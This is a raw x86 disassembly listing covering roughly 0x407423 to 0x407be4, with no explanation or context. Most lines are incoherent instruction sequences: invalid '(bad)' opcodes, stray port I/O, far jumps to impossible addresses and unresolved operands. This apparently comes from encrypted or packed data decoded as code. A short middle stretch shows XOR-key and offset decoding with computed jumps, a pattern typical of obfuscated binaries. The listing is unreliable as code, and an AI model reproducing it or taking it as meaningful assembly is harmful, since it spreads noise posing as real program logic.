  407423:	push   0xef31a2f3
  407428:	ficom  DWORD PTR [esi+0x78d0accc]
  40742e:	adc    DWORD PTR [edi+ebx*4-0x2c584973],esi
  407435:	fldcw  WORD PTR [edi+0x249bb80b]
  40743b:	jns    0x407406
  40743d:	loopne 0x40747f
  40743f:	hlt    
  407440:	cmp    bl,bh
  407442:	scas   eax,DWORD PTR es:[edi]
  407443:	adc    ebp,eax
  407445:	(bad)  
  407446:	enter  0xe188,0x2c
  40744a:	cmp    ebp,DWORD PTR [eax+ecx*2+0x54]
  40744e:	outs   dx,BYTE PTR ds:[esi]
  40744f:	push   ds
  407450:	das    
  407451:	bound  edx,QWORD PTR ds:0xc66fd5ff
  407457:	ret    0xda25
  40745a:	into   
  40745b:	das    
  40745c:	fstp   QWORD PTR [ebp-0x33]
  40745f:	test   DWORD PTR [ebp+0x746c6c65],eax
  407465:	cld    
  407466:	or     bh,BYTE PTR [edx]
  407468:	add    esi,DWORD PTR ss:[ecx+eax*8-0x37]
  40746d:	ins    BYTE PTR es:[edi],dx
  40746e:	mov    edx,0xfc02d04b
  407473:	pushf  
  407474:	sbb    ah,dh
  407476:	retf   
  407477:	jl     0x407456
  407479:	fidiv  DWORD PTR [ecx-0x43]
  40747c:	jo     0x4074ba
  40747e:	cmp    ax,0x91dc
  407482:	jbe    0x4074d7
  407484:	mov    esp,?
  407486:	dec    esp
  407487:	fidivr WORD PTR [esi+0x64]
  40748a:	pop    edx
  40748b:	(bad)  
  40748c:	fist   WORD PTR [eax+0x3]
  40748f:	hlt    
  407490:	daa    
  407491:	mov    esp,0xb5b7e4e2
  407496:	mov    eax,ds:0xcee8fbc0
  40749b:	mov    ebx,0x5affe664
  4074a0:	dec    ebx
  4074a1:	add    DWORD PTR [esi-0x7d63666d],ecx
  4074a7:	jge    0x407493
  4074a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074aa:	and    ebp,ebp
  4074ac:	loopne 0x407490
  4074ae:	xchg   edx,eax
  4074af:	cmp    BYTE PTR [edx-0x1db4ecbc],dl
  4074b5:	fs std 
  4074b7:	add    ah,dl
  4074b9:	data16 or BYTE PTR [eax-0x74],ah
  4074bd:	xor    bl,BYTE PTR [edx+0xa4875d]
  4074c3:	test   eax,0x20b9b23b
  4074c8:	call   0x6b516daa
  4074cd:	outs   dx,DWORD PTR ds:[esi]
  4074ce:	push   esp
  4074cf:	jmp    0x93731a59
  4074d4:	ins    BYTE PTR es:[edi],dx
  4074d5:	or     esi,esp
  4074d7:	mov    eax,0xd89c1c2c
  4074dc:	aas    
  4074dd:	loopne 0x4074ff
  4074df:	inc    esp
  4074e0:	shl    DWORD PTR [esi],cl
  4074e2:	call   FWORD PTR [eax]
  4074e4:	jo     0x407562
  4074e6:	mov    dh,0x7f
  4074e8:	or     DWORD PTR es:[edi+0x31],ecx
  4074ec:	xor    BYTE PTR [ecx-0x3e67bfbc],ah
  4074f2:	mov    bh,0x5b
  4074f4:	out    0xef,al
  4074f6:	sub    eax,0xd8074064
  4074fb:	cwde   
  4074fc:	mov    al,ds:0x2fdf89f1
  407501:	sbb    cl,BYTE PTR ds:[ebx+0x5a798566]
  407508:	ins    BYTE PTR es:[edi],dx
  407509:	in     al,dx
  40750a:	add    ebx,ecx
  40750c:	pop    ebx
  40750d:	mov    ds:0x9bf67630,al
  407512:	sub    DWORD PTR [ebx-0x2b517e5e],edi
  407518:	imul   ebp,edx,0xffffff97
  40751b:	or     eax,0x3e45778f
  407520:	adc    al,0xec
  407522:	xchg   DWORD PTR [eax+0x44],edx
  407525:	mov    ds:0x628eb67d,eax
  40752a:	and    eax,0x7f63bcca
  40752f:	(bad)
  407532:	aas    
  407533:	dec    eax
  407534:	shl    WORD PTR [ebx+0x172ebb31],0x97
  40753c:	dec    ebx
  40753d:	retf   0x937c
  407540:	jge    0x40751c
  407542:	das    
  407543:	xchg   ebx,eax
  407544:	mov    BYTE PTR [esi+0x77608004],bh
  40754a:	ret    
  40754b:	cld    
  40754c:	into   
  40754d:	mov    DWORD PTR [edx],ebx
  40754f:	inc    BYTE PTR [edi+0x1c6c4115]
  407555:	pusha  
  407556:	test   eax,0xe12e5769
  40755b:	add    DWORD PTR [edx],eax
  40755d:	cmc    
  40755e:	pop    ebp
  40755f:	mov    bh,BYTE PTR [edi-0x3ba619c5]
  407565:	lea    edx,[esp+ecx*8]
  407568:	xchg   edx,eax
  407569:	cwde   
  40756a:	inc    ebp
  40756b:	mov    ds:0x4597fb45,eax
  407570:	dec    edi
  407571:	adc    ebp,DWORD PTR [ebx-0x2b]
  407574:	(bad)  
  407576:	in     eax,0x27
  407578:	rcl    DWORD PTR [eax+0x6d3d87ed],0xd
  40757f:	inc    esp
  407580:	aam    0x1
  407582:	enter  0x38ae,0xa3
  407586:	mov    ebx,DWORD PTR [edi-0x911087]
  40758c:	jge    0x40753d
  40758e:	retf   0x6885
  407591:	dec    ecx
  407592:	xchg   ebp,eax
  407593:	dec    esp
  407594:	cdq    
  407595:	imul   ebp,ebp,0xffffffbe
  407598:	leave  
  407599:	out    dx,eax
  40759a:	inc    edx
  40759b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40759c:	and    al,0x26
  40759e:	ficom  DWORD PTR [ebx]
  4075a0:	inc    esi
  4075a1:	fstp   QWORD PTR [edi-0x56]
  4075a4:	fwait
  4075a5:	arpl   WORD PTR [ecx+0x190f4b06],ax
  4075ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075ac:	fs retf 0x417a
  4075b0:	cmp    bh,BYTE PTR [edx]
  4075b2:	inc    edi
  4075b3:	xor    al,0xb
  4075b5:	ror    bl,cl
  4075b7:	push   edx
  4075b8:	dec    edi
  4075b9:	iret   
  4075ba:	pop    edi
  4075bb:	adc    DWORD PTR [esi+eiz*2],ebx
  4075be:	fwait
  4075bf:	push   ss
  4075c0:	sub    BYTE PTR [esi],0x2a
  4075c3:	lahf   
  4075c4:	and    BYTE PTR [edi],0x32
  4075c7:	or     ch,BYTE PTR [eax-0x48]
  4075ca:	aam    0xd1
  4075cc:	mov    cl,0xb6
  4075ce:	push   es
  4075cf:	lods   eax,DWORD PTR ds:[esi]
  4075d0:	lds    edx,FWORD PTR [ebx]
  4075d2:	sbb    al,0x34
  4075d4:	ror    BYTE PTR [esi],cl
  4075d6:	loop   0x4075f4
  4075d8:	jmp    DWORD PTR [esi]
  4075da:	(bad)  
  4075db:	in     al,0x90
  4075dd:	jmp    FWORD PTR [esi-0x58]
  4075e0:	fs and bl,bl
  4075e3:	sub    edx,DWORD PTR [ecx-0x8110ea3]
  4075e9:	xor    edx,DWORD PTR [edi-0x2d0ae566]
  4075ef:	test   eax,0xa96831ba
  4075f4:	adc    eax,0x19c6b0ec
  4075f9:	sub    dl,dh
  4075fb:	int3   
  4075fc:	pop    esi
  4075fd:	es dec esp
  4075ff:	data16 cld 
  407601:	mov    edx,0x33777a
  407606:	ror    DWORD PTR [eax+0x429d23d0],cl
  40760c:	aam    0x7d
  40760e:	xchg   ecx,eax
  40760f:	movsx  ebx,WORD PTR [ebx+0x21]
  407613:	xchg   edx,eax
  407614:	mov    eax,0xbb1d9d5
  407619:	fstp   DWORD PTR [edi-0x4e]
  40761c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40761d:	mov    ah,0xdb
  40761f:	pushf  
  407620:	mov    esp,DWORD PTR [edx+0x12]
  407623:	and    eax,0xc2eb20a2
  407628:	js     0x40769a
  40762a:	xor    BYTE PTR [edi+0x65],bh
  40762d:	mov    eax,0xa5ace20e
  407632:	and    bh,ch
  407634:	sub    DWORD PTR [ebx+0xa],esi
  407637:	out    0xb3,al
  407639:	add    esi,DWORD PTR [edi-0x19]
  40763c:	xchg   dl,bh
  40763e:	int    0x84
  407640:	out    0x78,eax
  407642:	pop    eax
  407643:	sub    eax,0x24bdcb6a
  407648:	(bad)  
  407649:	aad    0x14
  40764b:	jo     0x4076a2
  40764d:	jne    0x40768a
  40764f:	sub    esi,ecx
  407651:	mov    esi,0xb6a93c0f
  407656:	push   esi
  407657:	xor    BYTE PTR [ebp*2-0x98f870e],ch
  40765e:	cld    
  40765f:	and    edx,DWORD PTR [edi-0x6cd3a477]
  407665:	dec    edi
  407666:	sar    DWORD PTR [ebx+0x43c8c75c],1
  40766c:	xlat   BYTE PTR ds:[ebx]
  40766d:	push   ebx
  40766e:	or     al,0xe9
  407670:	daa    
  407671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407672:	sub    dl,BYTE PTR [ebx+0x461d3c0]
  407678:	ins    BYTE PTR es:[edi],dx
  407679:	pushf  
  40767a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40767b:	pop    esp
  40767c:	mov    bl,0x35
  40767e:	ins    DWORD PTR es:[edi],dx
  40767f:	dec    ecx
  407680:	xor    ecx,DWORD PTR [esi-0x49]
  407683:	xchg   DWORD PTR [ebp+0xd],ebp
  407686:	sbb    ecx,DWORD PTR [edi+ebp*1+0x1a03f447]
  40768d:	push   ebx
  40768e:	push   esp
  40768f:	pop    esp
  407690:	sbb    al,0xfa
  407692:	es repnz mov ecx,0x9b8a1591
  407699:	mov    ds:0x282ea632,al
  40769e:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4076a0:	frstor [ecx-0x73]
  4076a3:	cmp    bh,BYTE PTR [esi+edi*2+0x32]
  4076a7:	mov    cl,dl
  4076a9:	in     al,dx
  4076aa:	pop    esi
  4076ab:	(bad)  
  4076ac:	daa    
  4076ad:	xor    eax,0x5fd73f3f
  4076b2:	test   BYTE PTR [edi-0x79],ch
  4076b5:	outs   dx,BYTE PTR ds:[esi]
  4076b6:	inc    ecx
  4076b7:	int3   
  4076b8:	jg     0x4076b8
  4076ba:	pusha  
  4076bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076bc:	shl    BYTE PTR [esi+esi*1],cl
  4076bf:	loope  0x407687
  4076c1:	repz fcomp QWORD PTR [ebp-0x5f]
  4076c5:	xchg   BYTE PTR [ecx-0x78],bl
  4076c8:	adc    eax,0x3781b356
  4076cd:	nop
  4076ce:	ja     0x407693
  4076d0:	aaa    
  4076d1:	cmp    DWORD PTR [esi-0x2aa1f468],edx
  4076d7:	mov    ah,0x9b
  4076d9:	imul   ebp,esp,0xabdea997
  4076df:	in     eax,dx
  4076e0:	(bad)  [edx+edi*2+0x303143f]
  4076e7:	je     0x407727
  4076e9:	call   0xa462:0x8352c107
  4076f0:	sti    
  4076f1:	xchg   esi,eax
  4076f2:	aaa    
  4076f3:	call   0x3b730b7
  4076f8:	dec    BYTE PTR [ebp+0x78]
  4076fb:	stos   BYTE PTR es:[edi],al
  4076fc:	cwde   
  4076fd:	and    eax,0xf3d7b69
  407702:	loopne 0x407763
  407704:	sbb    DWORD PTR [edi-0x58],0xffffffa0
  407708:	jns    0x40774f
  40770a:	or     DWORD PTR [ecx+eax*1],edi
  40770d:	dec    ecx
  40770e:	iret   
  40770f:	jb     0x407702
  407711:	pop    ds
  407712:	loop   0x40770d
  407714:	in     eax,dx
  407715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407716:	xchg   edi,eax
  407717:	mov    eax,ds:0xb0081031
  40771c:	xchg   ebx,eax
  40771d:	sbb    dl,BYTE PTR [edi+0x53]
  407720:	sbb    BYTE PTR [ebx+esi*4-0x39],bl
  407724:	ins    DWORD PTR es:[edi],dx
  407725:	xchg   ecx,eax
  407726:	push   edx
  407727:	lods   al,BYTE PTR ds:[esi]
  407728:	jbe    0x40774d
  40772a:	daa    
  40772b:	loopne 0x407708
  40772d:	ror    BYTE PTR [ebx+0x3],0x66
  407731:	test   eax,ecx
  407733:	dec    ecx
  407734:	loope  0x407779
  407736:	mov    ds:0x221dce0a,eax
  40773b:	enter  0x395c,0xda
  40773f:	sahf   
  407740:	retf   
  407741:	lods   al,BYTE PTR ds:[esi]
  407742:	mov    ebp,0x576c0d17
  407747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407748:	xchg   ecx,eax
  407749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40774a:	popf   
  40774b:	stos   BYTE PTR es:[edi],al
  40774c:	dec    edi
  40774d:	jne    0x40779e
  40774f:	scas   eax,DWORD PTR es:[edi]
  407750:	jo     0x407791
  407752:	push   eax
  407753:	aam    0xd
  407755:	cmp    DWORD PTR [edx+eax*4-0xdcda840],eax
  40775c:	rcr    esi,cl
  40775e:	push   edx
  40775f:	xchg   esi,eax
  407760:	pusha  
  407761:	and    eax,0xa0e26bb2
  407766:	mov    ds:0xbee841,eax
  40776b:	pop    ss
  40776c:	sbb    edx,DWORD PTR [ebx]
  40776e:	fisubr WORD PTR [ebx+edi*2+0x38]
  407772:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  407774:	fs pop edx
  407776:	loope  0x40776e
  407778:	adc    BYTE PTR [edi-0x55],dh
  40777b:	dec    esp
  40777c:	cmp    BYTE PTR [edi-0x10548fab],cl
  407782:	pop    ss
  407783:	cwde   
  407784:	adc    al,0x30
  407786:	test   BYTE PTR [esi-0x62],ch
  407789:	stos   BYTE PTR es:[edi],al
  40778a:	xor    DWORD PTR [ebx],esi
  40778c:	sti    
  40778d:	js     0x4077b0
  40778f:	sbb    bl,ch
  407791:	test   eax,0x3ff3b836
  407796:	xchg   edi,eax
  407797:	pop    edx
  407798:	push   eax
  407799:	or     DWORD PTR cs:[esi-0x25],0x62dd7f33
  4077a1:	and    al,BYTE PTR [edx+0x1d]
  4077a4:	cmc    
  4077a5:	jle    0x4077da
  4077a7:	es sub eax,0x16b73558
  4077ad:	ret    0xde98
  4077b0:	in     eax,dx
  4077b1:	sbb    BYTE PTR [edi-0x13],0x2f
  4077b5:	pop    edx
  4077b6:	js     0x407795
  4077b8:	push   esp
  4077b9:	popf   
  4077ba:	ins    DWORD PTR es:[edi],dx
  4077bb:	ds pop ebx
  4077bd:	data16 (bad) 
  4077bf:	and    BYTE PTR [esi+0x2f2fb71f],bh
  4077c5:	fs adc bh,0x94
  4077c9:	js     0x40774d
  4077cb:	add    esp,DWORD PTR [esp+ecx*8]
  4077ce:	xor    al,0x9d
  4077d0:	and    esp,DWORD PTR [esi]
  4077d2:	adc    BYTE PTR es:[edi-0x4a],0x13
  4077d7:	pop    esp
  4077d8:	xor    DWORD PTR [eax],esp
  4077da:	lods   al,BYTE PTR ds:[esi]
  4077db:	in     eax,0x72
  4077dd:	test   eax,0xb00ce775
  4077e2:	fdivr  QWORD PTR [edi]
  4077e4:	and    WORD PTR [bx+si],0x3a99
  4077ea:	ret    0xf9b3
  4077ed:	lahf   
  4077ee:	cmp    eax,0x566d0ec5
  4077f3:	sbb    esp,edx
  4077f5:	push   0xa27016ef
  4077fa:	nop
  4077fb:	rcl    al,1
  4077fd:	fdivrp st(3),st
  4077ff:	mov    ah,0x23
  407801:	pop    ds
  407802:	test   eax,0x27aa3fdf
  407807:	call   0x6c2a9d34
  40780c:	xchg   ecx,eax
  40780d:	inc    esi
  40780e:	sub    edi,DWORD PTR [ebx+0x1ea7aba9]
  407814:	ror    DWORD PTR ds:0x6c329adc,1
  40781a:	adc    BYTE PTR [ebx+esi*1+0x72],dl
  40781e:	scas   al,BYTE PTR es:[edi]
  40781f:	retf   0x7af
  407822:	test   DWORD PTR [esi+0x13fb1db5],esi
  407828:	dec    ebp
  407829:	and    eax,0x70bc9a7b
  40782e:	repz dec ebx
  407830:	ins    DWORD PTR es:[edi],dx
  407831:	dec    cl
  407833:	or     eax,0x5545313a
  407838:	fst    QWORD PTR [ebx+0x10e64d7f]
  40783e:	pop    es
  40783f:	test   BYTE PTR [ecx],bl
  407841:	jo     0x407857
  407843:	jge    0x407850
  407845:	fcom   QWORD PTR [ecx+0x35]
  407848:	jne    0x40784c
  40784a:	imul   eax
  40784c:	pop    esi
  40784d:	sbb    eax,0xdc89f8ed
  407852:	sub    ebp,ecx
  407854:	xchg   ebx,eax
  407855:	xor    eax,0x3934000a
  40785a:	cli    
  40785b:	adc    dl,BYTE PTR [ecx]
  40785d:	lds    eax,FWORD PTR [eax+0x13]
  407860:	test   al,0x86
  407862:	lods   eax,DWORD PTR ds:[esi]
  407863:	xor    DWORD PTR [edi+eiz*2],ebp
  407866:	fimul  WORD PTR [edx+0x74]
  407869:	cld    
  40786a:	fsqrt  
  40786c:	aas    
  40786d:	aas    
  40786e:	sub    ebx,esp
  407870:	cld    
  407871:	je     0x4078cb
  407873:	mov    cl,0xfd
  407875:	push   eax
  407876:	std    
  407877:	mov    ds:0xb8800eff,eax
  40787c:	and    esp,DWORD PTR [ecx+0x3c19cd56]
  407882:	jmp    0x407837
  407884:	mov    ecx,ebx
  407886:	xlat   BYTE PTR ds:[ebx]
  407887:	cmp    cl,cl
  407889:	mov    ?,WORD PTR [esi+0x64]
  40788c:	in     al,dx
  40788d:	push   esp
  40788e:	jae    0x4078eb
  407890:	and    bh,BYTE PTR [ebx-0x3c]
  407893:	push   ebx
  407894:	pop    es
  407895:	xor    ebx,DWORD PTR [edx]
  407897:	in     eax,0xa0
  407899:	xchg   edi,ebx
  40789b:	fs hlt 
  40789d:	xchg   esi,eax
  40789e:	fmul   st(2),st
  4078a0:	test   BYTE PTR [eax+0x450e9c0d],0x1e
  4078a7:	cld    
  4078a8:	adc    eax,0x1600ed1b
  4078ad:	retf   0x535c
  4078b0:	sub    bl,BYTE PTR [eax]
  4078b2:	ror    BYTE PTR [eax+0x2d],cl
  4078b5:	cmp    eax,DWORD PTR ds:0x609045ac
  4078bb:	in     al,0xb7
  4078bd:	push   edi
  4078be:	(bad)  
  4078bf:	mov    edx,0xd2ee2e9e
  4078c4:	bound  ecx,QWORD PTR [ebx+0x66]
  4078c7:	xchg   edi,eax
  4078c8:	test   BYTE PTR [ebx+0x5be461dc],bh
  4078ce:	dec    esi
  4078cf:	sbb    cl,cl
  4078d1:	xlat   BYTE PTR ds:[ebx]
  4078d2:	mov    bh,0x1a
  4078d4:	xor    dl,BYTE PTR [bp+di]
  4078d7:	sub    eax,0x9052cfa
  4078dc:	mov    al,0xca
  4078de:	mov    edx,0x3a0df7f7
  4078e3:	fbstp  TBYTE PTR [esi]
  4078e5:	adc    eax,0x5bfd7ece
  4078ea:	cmp    BYTE PTR [ecx+esi*1],ah
  4078ed:	inc    edi
  4078ee:	retf   0x5b49
  4078f1:	call   0xe2d8:0xab955144
  4078f8:	jb     0x4078a1
  4078fa:	int3   
  4078fb:	push   0xb653d6f6
  407900:	mov    dh,0xe0
  407902:	retf   
  407903:	ret    0x1adc
  407906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407907:	push   edx
  407908:	scas   al,BYTE PTR es:[edi]
  407909:	jne    0x4078e0
  40790b:	bound  ecx,QWORD PTR [edx]
  40790d:	xchg   DWORD PTR [eax-0x2086dd42],esi
  407913:	fldcw  WORD PTR [ebx+0x6a142998]
  407919:	imul   esi,DWORD PTR [edx],0x8c2bbcf4
  40791f:	pop    eax
  407920:	aas    
  407921:	(bad)  
  407922:	mov    edi,0xb82759dc
  407927:	fistp  DWORD PTR [eax]
  407929:	std    
  40792a:	dec    ecx
  40792b:	sbb    ebx,DWORD PTR [eax]
  40792d:	mov    ds:0x1329a707,al
  407932:	mul    DWORD PTR [edx]
  407934:	mov    dh,0x40
  407936:	es pop esp
  407938:	push   ss
  407939:	push   esi
  40793a:	sub    eax,0xe949c65c
  40793f:	not    BYTE PTR [ecx+ebp*1]
  407942:	pop    es
  407943:	add    ch,ah
  407945:	sbb    BYTE PTR [edx-0x32],dh
  407948:	adc    al,0xe6
  40794a:	dec    edi
  40794b:	and    eax,0xbca70da9
  407950:	add    dl,dl
  407952:	mov    al,ds:0xa0d6eabf
  407957:	cwde   
  407958:	mov    cl,0xad
  40795a:	pop    edx
  40795b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40795c:	or     eax,0x1c487e6
  407962:	imul   edi,esp,0x960b56da
  407968:	shr    DWORD PTR [edx],1
  40796a:	test   BYTE PTR [edx+0x4c],bl
  40796d:	pusha  
  40796e:	test   DWORD PTR [eax-0x4c],0xadf39d82
  407975:	sub    cl,BYTE PTR [edi+ecx*4]
  407978:	xor    ch,dl
  40797a:	push   esp
  40797b:	outs   dx,BYTE PTR ds:[esi]
  40797c:	in     eax,dx
  40797d:	in     eax,0x99
  40797f:	jne    0x40799f
  407981:	push   esp
  407982:	jl     0x40795a
  407984:	push   ebx
  407985:	fwait
  407986:	adc    ecx,ebx
  407988:	mov    ah,0x39
  40798a:	loope  0x4079fc
  40798c:	sti    
  40798d:	retf   0xc27e
  407990:	xchg   ecx,eax
  407991:	(bad)  
  407992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407993:	enter  0xf4d5,0x8b
  407997:	xchg   ebx,eax
  407998:	adc    BYTE PTR [ecx-0x74cd1a9d],0xab
  40799f:	(bad)  
  4079a0:	in     eax,0x65
  4079a2:	fs xor al,0xde
  4079a5:	sbb    DWORD PTR [eax+0x7e],ebx
  4079a8:	push   0xffffffd1
  4079aa:	das    
  4079ab:	sbb    esi,DWORD PTR [ecx+0x2524ce6f]
  4079b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079b2:	imul   esp,DWORD PTR [edx-0x2f],0xfffffffe
  4079b6:	mov    esi,ds
  4079b8:	pusha  
  4079b9:	mov    al,0xc6
  4079bb:	inc    esi
  4079bc:	pop    esi
  4079bd:	rcr    BYTE PTR [ecx],cl
  4079bf:	fist   DWORD PTR [edi-0x37]
  4079c2:	fadd   st(1),st
  4079c4:	retf   
  4079c5:	cmp    BYTE PTR [ebp-0x7efbffc6],ch
  4079cb:	pop    esp
  4079cc:	pushf  
  4079cd:	stos   BYTE PTR es:[edi],al
  4079ce:	dec    ecx
  4079cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079d0:	jmp    0x1f11d333
  4079d5:	mov    edi,0xcbc42efb
  4079da:	xchg   ebp,eax
  4079db:	mov    dl,0xb5
  4079dd:	jg     0x407a3c
  4079df:	xor    DWORD PTR [eax+0x34],ecx
  4079e2:	sbb    al,0x8a
  4079e4:	mov    ah,0xc
  4079e6:	sbb    edx,esp
  4079e8:	fisub  WORD PTR [ebp-0x1e29f0bc]
  4079ee:	mov    ch,0x7f
  4079f0:	sub    DWORD PTR [ebx],eax
  4079f2:	cli    
  4079f3:	pop    ss
  4079f4:	in     eax,0xbc
  4079f6:	or     ah,cl
  4079f8:	shld   DWORD PTR [edi-0x59],ebx,0x20
  4079fd:	imul   ecx,DWORD PTR [ebp+0x3],0x50
  407a01:	int3   
  407a02:	push   esi
  407a03:	jnp    0x4079e4
  407a05:	dec    ebp
  407a06:	retf   0x95c4
  407a09:	adc    bl,al
  407a0b:	ret    0x31f1
  407a0e:	jae    0x40799a
  407a10:	mov    esi,0xd0611cf2
  407a15:	and    eax,0xcf16502c
  407a1a:	xchg   BYTE PTR ds:0xd0053d30,dh
  407a20:	mov    esp,0xd6482ff4
  407a25:	imul   edi,DWORD PTR [esi-0x10],0xb5b1eced
  407a2c:	push   DWORD PTR [eax+eiz*2-0xe]
  407a30:	mov    al,0x12
  407a32:	mov    WORD PTR [edx+0x2c716888],ss
  407a38:	cld    
  407a39:	pop    ss
  407a3a:	mov    cl,0x79
  407a3c:	push   edx
  407a3d:	gs push cs
  407a3f:	adc    ah,BYTE PTR [ecx+0x2]
  407a42:	call   0x8bfc:0x4d8b45c4
  407a49:	push   ebp
  407a4a:	shl    BYTE PTR [ebx],1
  407a4c:	retf   
  407a4d:	add    ecx,eax
  407a4f:	cmp    edx,ecx
  407a51:	je     0x407abe
  407a57:	lea    eax,[ebp-0x8]
  407a5a:	push   eax
  407a5b:	push   DWORD PTR [ebp-0x28]
  407a5e:	push   DWORD PTR [ebp+0xc]
  407a61:	call   0x40f238
  407a66:	mov    eax,0x3272dd
  407a6b:	mov    ecx,DWORD PTR [ebp-0x4]
  407a6e:	mov    edx,DWORD PTR [ebp-0x8]
  407a71:	xor    ecx,ebx
  407a73:	add    ecx,eax
  407a75:	cmp    edx,ecx
  407a77:	je     0x407a92
  407a7d:	mov    ecx,DWORD PTR [ebp-0x34]
  407a80:	movzx  ecx,WORD PTR [ecx+esi*2]
  407a84:	mov    edx,DWORD PTR [ebp-0x18]
  407a87:	mov    ecx,DWORD PTR [edx+ecx*4]
  407a8a:	mov    DWORD PTR [ebp-0x38],ecx
  407a8d:	jmp    0x4056db
  407a92:	mov    ecx,DWORD PTR [ebp-0x14]
  407a95:	xor    ecx,ebx
  407a97:	lea    esi,[esi+ecx*1+0x3272dd]
  407a9e:	jmp    0x40540c
  407aa3:	mov    eax,DWORD PTR [ebp-0x4]
  407aa6:	xor    eax,ebx
  407aa8:	add    eax,edi
  407aaa:	jmp    0x409f7a
  407aaf:	mov    eax,DWORD PTR [ebp-0x4]
  407ab2:	xor    eax,ebx
  407ab4:	add    eax,0x3272dd
  407ab9:	jmp    0x409f7a
  407abe:	mov    ecx,DWORD PTR [ebp-0x38]
  407ac1:	add    ecx,DWORD PTR [ebp+0x8]
  407ac4:	mov    DWORD PTR [ebp-0x10],ecx
  407ac7:	mov    ecx,DWORD PTR [ebp-0x1c]
  407aca:	test   ecx,ecx
  407acc:	je     0x409f05
  407ad2:	mov    DWORD PTR [ebp-0x20],0x0
  407ad9:	push   0x3
  407adb:	xor    edx,edx
  407add:	pop    edx
  407ade:	add    edx,0x8
  407ae1:	push   edx
  407ae2:	pop    ecx
  407ae3:	push   0x6
  407ae5:	dec    ecx
  407ae6:	pop    ebx
  407ae7:	dec    ebx
  407ae8:	xchg   ebx,ecx
  407aea:	sub    ebx,ecx
  407aec:	xchg   ebx,ecx
  407aee:	dec    ecx
  407aef:	mov    eax,DWORD PTR [ebp-0x1c]
  407af2:	imul   eax,ecx
  407af5:	sub    esp,eax
  407af7:	mov    DWORD PTR [ebp-0x20],esp
  407afa:	mov    eax,DWORD PTR [ebp-0x4]
  407afd:	mov    ecx,0x7510896
  407b02:	xor    eax,ecx
  407b04:	mov    edx,0x3272dd
  407b09:	add    eax,edx
  407b0b:	mov    DWORD PTR [ebp+0x8],eax
  407b0e:	mov    eax,DWORD PTR [ebp-0x14]
  407b11:	xor    eax,ecx
  407b13:	add    eax,edx
  407b15:	mov    edx,DWORD PTR [ebp+0x14]
  407b18:	jmp    0x409e70
  407b1d:	push   es
  407b1e:	or     DWORD PTR [esi],ebx
  407b20:	xchg   DWORD PTR [ecx],eax
  407b22:	xchg   DWORD PTR [ebx+0x7caff18b],ecx
  407b28:	xor    eax,0x867ccce4
  407b2d:	nop
  407b2e:	and    BYTE PTR [edx+0x7a],bh
  407b31:	aaa    
  407b32:	pop    edi
  407b33:	jp     0x407baf
  407b35:	jg     0x407b8e
  407b37:	sub    BYTE PTR [eax+0x3d],bh
  407b3a:	or     ebx,DWORD PTR [ecx-0x39873ac3]
  407b40:	loopne 0x407aee
  407b42:	and    eax,0xf6dac907
  407b47:	adc    DWORD PTR [ebp+0x44a509f5],ecx
  407b4d:	jmp    0x407b94
  407b4f:	pop    edi
  407b50:	es in  al,0x9a
  407b53:	dec    edx
  407b54:	push   es
  407b55:	sub    eax,0x9c740d52
  407b5a:	hlt    
  407b5b:	lods   eax,DWORD PTR ds:[esi]
  407b5c:	test   al,0x8b
  407b5e:	stc    
  407b5f:	jnp    0x407ba8
  407b61:	nop
  407b62:	and    eax,0x27b4b74f
  407b67:	or     dl,BYTE PTR [esi+0x70]
  407b6a:	ret    
  407b6b:	arpl   WORD PTR [edx],bx
  407b6d:	int3   
  407b6e:	fstp   QWORD PTR [edx+0x1c]
  407b71:	cmp    eax,0x49368776
  407b76:	test   DWORD PTR [edi-0x5a],eax
  407b79:	outs   dx,DWORD PTR ds:[esi]
  407b7a:	xlat   BYTE PTR ds:[ebx]
  407b7b:	test   BYTE PTR [edi-0x7199953b],ch
  407b81:	hlt    
  407b82:	push   ecx
  407b83:	push   ss
  407b84:	repz enter 0x7a92,0x5d
  407b89:	jl     0x407bdd
  407b8b:	pop    ss
  407b8c:	xor    BYTE PTR [edi+0x57],0xfe
  407b90:	repz enter 0xae3,0x2c
  407b95:	jmp    0x1893:0x15fd196a
  407b9c:	pop    ecx
  407b9d:	xchg   edi,eax
  407b9e:	add    bh,ah
  407ba0:	inc    esi
  407ba1:	sahf   
  407ba2:	ins    DWORD PTR es:[edi],dx
  407ba3:	adc    eax,0xfd3b4a0a
  407ba8:	popf   
  407ba9:	cmp    BYTE PTR [esi],dh
  407bab:	sub    BYTE PTR [edi-0x1efb8ffe],ah
  407bb1:	xor    bl,dh
  407bb3:	mov    ebp,0x38bfd6eb
  407bb8:	mov    WORD PTR [ecx+0x78fb5fbc],ss
  407bbe:	retf   
  407bbf:	cmp    eax,DWORD PTR [ebx+0x39]
  407bc2:	sbb    BYTE PTR [esi],bl
  407bc4:	scas   al,BYTE PTR es:[edi]
  407bc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bc6:	iret   
  407bc7:	xchg   edi,eax
  407bc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bc9:	sub    esi,edi
  407bcb:	in     al,0x4c
  407bcd:	xor    DWORD PTR [esi-0x206eca20],0xffffffd8
  407bd4:	mov    ah,bl
  407bd6:	loopne 0x407b5a
  407bd8:	cmp    dl,BYTE PTR [ecx+0x43]
  407bdb:	shl    edi,cl
  407bdd:	sbb    edx,DWORD PTR [eax]
  407bdf:	jbe    0x407bcb
  407be1:	ins    DWORD PTR es:[edi],dx
  407be2:	push   eax
  407be3:	pop    es
  407be4:	sub    ebp,DWORD PTR [ebx]
